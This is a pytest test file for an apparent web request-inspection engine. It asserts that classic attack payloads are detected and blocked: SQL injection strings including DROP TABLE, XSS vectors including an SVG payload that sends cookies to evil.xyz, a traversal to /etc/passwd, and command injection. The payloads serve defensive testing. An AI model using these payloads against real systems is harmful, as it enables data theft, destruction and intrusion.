import pytest
from app.detection.engine import inspect_request_data, normalize_input

def test_normalization():
    # Recursive URL decoding
    assert normalize_input("id%2527%20UNION") == "id' UNION"
    # Null byte stripping
    assert "\x00" not in normalize_input("file.php\x00.jpg")

def test_sqli_union():
    res = inspect_request_data(payload="1 UNION SELECT 1,username,password FROM users--")
    assert res["is_attack"] is True
    assert res["attack_category"] == "SQL Injection"
    assert res["verdict"] == "BLOCKED"
    assert res["severity"] == "CRITICAL"

def test_sqli_tautology():
    res = inspect_request_data(payload="' OR '1'='1")
    assert res["is_attack"] is True
    assert res["attack_category"] == "SQL Injection"
    assert res["verdict"] == "BLOCKED"

def test_sqli_stacked_drop():
    res = inspect_request_data(payload="105; DROP TABLE users--")
    assert res["is_attack"] is True
    assert res["attack_category"] == "SQL Injection"
    assert res["verdict"] == "BLOCKED"

def test_xss_script_tag():
    res = inspect_request_data(payload="<script>alert('XSS')</script>")
    assert res["is_attack"] is True
    assert res["attack_category"] == "Cross-Site Scripting"
    assert res["verdict"] == "BLOCKED"
    assert res["severity"] == "CRITICAL"

def test_xss_inline_event():
    res = inspect_request_data(payload="<img src=x onerror=alert(1)>")
    assert res["is_attack"] is True
    assert res["attack_category"] == "Cross-Site Scripting"
    assert res["verdict"] == "BLOCKED"

def test_xss_svg_vector():
    res = inspect_request_data(payload="<svg/onload=fetch('//evil.xyz/'+document.cookie)>")
    assert res["is_attack"] is True
    assert res["attack_category"] == "Cross-Site Scripting"
    assert res["verdict"] == "BLOCKED"

def test_directory_traversal():
    res = inspect_request_data(payload="../../../../etc/passwd")
    assert res["is_attack"] is True
    assert res["attack_category"] in ("Directory Traversal", "Local File Inclusion")
    assert res["verdict"] == "BLOCKED"

def test_command_injection():
    res = inspect_request_data(payload="127.0.0.1; whoami")
    assert res["is_attack"] is True
    assert res["attack_category"] == "Command Injection"
    assert res["verdict"] == "BLOCKED"

def test_scanner_user_agent():
    res = inspect_request_data(payload="", headers={"User-Agent": "sqlmap/1.6.12#stable"})
    assert res["is_attack"] is True
    assert res["attack_category"] == "Scanner Detection"
    assert res["verdict"] == "BLOCKED"

def test_benign_traffic():
    benign_samples = [
        "apple and orange juice",
        "john.doe@example.com",
        "search query for cybersecurity projects",
        "12345",
        "c++ programming guide"
    ]
    for sample in benign_samples:
        res = inspect_request_data(payload=sample)
        assert res["is_attack"] is False
        assert res["verdict"] == "ALLOWED"
        assert res["severity"] == "SAFE"
